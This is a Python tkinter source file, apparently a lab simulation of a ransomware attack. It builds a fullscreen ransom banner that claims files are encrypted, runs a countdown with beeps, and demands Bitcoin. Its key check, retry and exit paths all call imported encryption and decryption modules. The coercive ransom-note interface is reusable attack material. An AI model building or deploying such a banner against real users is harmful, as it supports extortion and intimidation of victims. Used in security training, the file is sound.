import tkinter as tk
from tkinter import messagebox
import time
import winsound
import Encryption
import Decryption
import filediscovery

folder_path = "Important_Folder"


class RansomwareBanner:
    def __init__(self, root):
        self.root = root
        self.root.title("SYSTEM ALERT")
        self.root.attributes("-fullscreen", True)
        self.root.configure(bg="darkred")
        self.correct_key = "key"
        self.failed_attempts = 0
        self.time_remaining = 610  # 10 minutes and 10 second countdown (simulation)
        # Title
        self.title_label = tk.Label(
            root,
            text="⚠ ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE PHISH2RANSOM GROUP⚠",
            font=("Helvetica", 28, "bold"),
            fg="white",
            bg="darkred",
        )
        self.title_label.pack(pady=40)

        # Main message
        self.message_label = tk.Label(
            root,
            text=(
                "All critical documents files on this system have been locked!\n\n"
                "To restore access, follow the instructions below!\n"
                "FAILURE TO COMPLY MAY RESULT IN PERMANENT DATA LOSS!\n"
                "YOU ARE ONLY ALLOWED 3 ATTEMPTS BEFORE THE FILES ARE CORRUPTED!"
            ),
            font=("Helvetica", 20),
            fg="white",
            bg="darkred",
            justify="center",
        )
        self.message_label.pack(pady=20)

        # Countdown
        self.timer_label = tk.Label(
            root,
            text="Time Remaining: 15:00",
            font=("Helvetica", 24, "bold"),
            fg="yellow",
            bg="darkred",
        )
        self.timer_label.pack(pady=30)

        # victim's instructions
        self.instructions_label = tk.Label(
            root,
            text=(
                "Send 1 Bitcoin to the listed address.\n"
                "Bitcoin Address: 1FfmbHfnpaZjKFvy21FokTjJJusN455paPH\n"
                "Then contact: recovery@securemail.com for the decryption key\n\n"
            ),
            font=("Helvetica", 18),
            fg="white",
            bg="darkred",
            justify="center",
        )
        self.instructions_label.pack(pady=20)

        # Decryption key Textbox
        self.code_entry = tk.Entry(
            root, font=("Helvetica", 18), justify="center", fg="grey"
        )
        self.code_entry.insert(0, "Enter Decryption Key")
        self.code_entry.pack(pady=10)
        self.code_entry.bind("<FocusIn>", self.clear_placeholder)
        self.code_entry.bind("<FocusOut>", self.add_placeholder)

        # Submit button
        self.submit_button = tk.Button(
            root,
            text="Submit Decryption Key",
            font=("Helvetica", 16),
            command=self.check_decrypt_key,
        )
        self.submit_button.pack(pady=10)

        # Exit Button (Lab Safe)
        self.exit_button = tk.Button(
            root,
            text="Exit Simulation",
            font=("Helvetica", 16),
            command=self.exit_simulation,
        )
        self.exit_button.pack(pady=40)
        self.update_timer()

    def increment(self):
        self.failed_attempts += 1

    def update_timer(self):
        if self.time_remaining > 0:
            mins, secs = divmod(self.time_remaining, 60)
            time_format = f"Time Remaining: {mins:02d}:{secs:02d}"
            self.timer_label.config(text=time_format)

            # Start beeping at 10mins
            if self.time_remaining <= 600:
                winsound.Beep(1000, 500)

            self.time_remaining -= 1
            self.root.after(1000, self.update_timer)

        else:
            messagebox.showinfo("Simulation", "Timer is up!")

    def clear_placeholder(self, event):
        if self.code_entry.get() == "Enter Decryption Key":
            self.code_entry.delete(0, tk.END)
            self.code_entry.config(fg="black")

    def add_placeholder(self, event):
        if not self.code_entry.get():
            self.code_entry.insert(0, "Enter Decryption Key")
            self.code_entry.config(fg="grey")

    def check_decrypt_key(self):
        pwd = self.code_entry.get()

        # Ignore placeholder
        if pwd == "Enter Decryption Key":
            return

        if pwd == self.correct_key:
            discover_path = filediscovery.scan_files()
            for path in discover_path:
                Decryption.decrypt_file(path["path"])  # Decrypts the file
            messagebox.showinfo(
                "Access Restored", "Files successfully been decrypted ✅🔓"
            )
            self.root.destroy()

        if pwd != self.correct_key:
            self.increment()  # increments by 1
            messagebox.showerror("ERROR", "Invalid decryption key provided.")

        if self.failed_attempts > 2:
            messagebox.showerror(
                "ERROR", "After failing 3 attempts, Files have now been corrupted!☠️☠️☠️"
            )
            discover_path = filediscovery.scan_files()
            for path in discover_path:
                Decryption.decrypt_file(path["path"])  # Decrypts the file
            self.root.destroy()

    def exit_simulation(self):
        discover_path = filediscovery.scan_files()
        for path in discover_path:
            Decryption.decrypt_file(path["path"])  # Decrypts the file
        self.root.destroy()


# if __name__ == "__main__":
#    Encryption.encrypt_folder(folder_path)
#    root = tk.Tk()
#    app = RansomwareBanner(root)
#   root.mainloop()
